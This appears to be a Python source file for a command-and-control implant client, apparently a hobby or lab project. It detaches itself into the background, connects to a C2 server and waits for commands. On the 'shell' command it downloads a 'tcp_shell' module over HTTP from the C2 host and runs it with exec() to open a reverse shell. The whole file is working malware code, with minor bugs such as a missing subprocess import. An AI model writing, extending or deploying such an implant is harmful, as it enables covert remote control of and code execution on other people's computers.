import socket,threading,os,sys

from urllib import request


def make_threaded(func):
    
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread 
    return wrapper

def detach_process():
    """
    Detaches the current process from its controlling terminal and runs it in the background.
    """
    # Windows-specific detachment
    if os.name == 'nt':
        try:
            # Use subprocess to create a detached process
            # https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP

            # Ensure the child process uses the same Python interpreter as the parent.
            python_executable = sys.executable
            script_path = os.path.abspath(__file__)  # Get the full path of the current script

            process = subprocess.Popen(
                [python_executable, script_path],
                creationflags=flags,
                stdout=subprocess.PIPE,  # Redirect stdout to a pipe
                stderr=subprocess.PIPE,  # Redirect stderr to a pipe
                stdin=subprocess.PIPE,   # Redirect stdin to a pipe
            )

            # The parent process exits immediately, leaving the detached process running.
            return

        except Exception as e:
            print(f"Error detaching process: {e}")
    else:
        try:
            # Fork the current process
            pid = os.fork()

            if pid > 0:
                # Exit the parent process
                sys.exit(0)
            else:
                # This is the child process

                # Create a new session ID for the child process
                os.setsid()

                # Fork again to ensure the child process is not a session leader
                pid = os.fork()

                if pid > 0:
                    # Exit the first child process
                    sys.exit(0)
                else:
                    # This is the second child process (now a daemon)

                    # Change the working directory to the root directory
                    os.chdir("/")

                    # Close standard file descriptors
                    os.close(0)
                    os.close(1)
                    os.close(2)

                    # Open /dev/null for standard input, output, and error
                    os.open(os.devnull, os.O_RDWR)
                    os.dup2(0, 1)
                    os.dup2(0, 2)


        except OSError as e:
            print(f"Error detaching process: {e}")

class client():

    def __init__(self, host, port):
        self.host = host
        self.host_port = port
        self.connection = self.connect()

    #create a connection to C2 server
    def connect(self):
        print("creating connection")
        connection = socket.create_connection((self.host,self.host_port))
        data = connection.recv(1)
        if str(data.decode()) == 'g':
            print("connection established")
            connection.send('g'.encode())
        
        return connection
    
    @make_threaded
    def run_module(self,name):
        url = f"http://{self.host}:5001/{name}.py"
        module = request.urlopen(url).read().decode('utf-8') 
        exec(module)
        return


    #listen for commands
    def run(self):
         while True:
            try:
                instruction = self.connection.recv(1024).decode()
                print(f"Received instruction: {instruction}")
                if not instruction:
                    print("breakingh")
                    break
                elif instruction == 'shell':
                    print("starting  reverse shell")
                    threading.Thread(target=self.run_module, args=('tcp_shell',)).start()
                elif(str(instruction) == 'g'):
                    self.connection.send('g'.encode())

            except Exception as e:
                print(e)
                self.connection.sendall(str(e).encode()) 
        

detach_process()            
c = client('localhost', 5000)
c.run()
print("running")
   